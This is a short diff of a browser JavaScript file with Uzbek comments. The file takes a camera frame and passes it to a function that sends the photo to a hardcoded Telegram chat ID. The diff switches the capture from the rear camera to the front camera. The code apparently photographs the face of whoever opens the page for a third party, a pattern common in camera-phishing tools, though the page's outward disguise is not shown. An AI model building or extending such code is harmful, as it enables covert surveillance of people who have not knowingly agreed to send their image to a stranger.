@@ -5,8 +5,8 @@ const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying
 // Video elementini tanlang
 const video = document.getElementById('video');
 
-// MediaStream orqali video oqimini olish
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }) // Orqa kamerani ishlatish
+// MediaStream orqali old kamerani ishlatish
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Old kamera
     .then(stream => {
         video.srcObject = stream;
 
@@ -41,7 +41,7 @@ function takePicture() {
         const imageData = canvas.toDataURL('image/png');
         sendPhotoToTelegram(imageData);
     } else {
-        console.error('Video o\'lchamlari to\'g\'ri yuklanmadi.');
+        console.error('Video olchamlari togri yuklanmadi.');
     }
 }
 
